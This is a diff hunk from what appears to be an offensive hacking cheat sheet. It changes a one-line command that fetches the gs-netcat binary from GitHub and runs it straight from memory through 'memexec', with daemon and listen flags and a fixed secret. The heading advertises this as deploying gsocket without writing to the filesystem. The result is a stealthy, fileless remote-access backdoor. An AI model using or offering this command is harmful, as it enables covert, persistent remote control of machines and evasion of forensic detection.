@@ -2039,9 +2039,9 @@ exec {"/proc/$$/fd/$f"} '"${strargv0}"'@ARGV or die "exec: $!";' -- "$@"
 ```
 (Thank you [tmp.Out](https://tmpout.sh/) for some educated discussions)
 
-Deploy gsocket (example):
+Deploy gsocket without writing to the filesystem (example):
 ```sh
-GS_ARGS="-ilqD -s 5sLosWHZLpE9riqt74KvG9" memexec <(curl -SsfL https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-$(uname -m))
+curl -SsfL https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-$(uname -m) | GS_ARGS="-ilqD -s 5sLosWHZLpE9riqt74KvG9" memexec
 ```
 
 ---
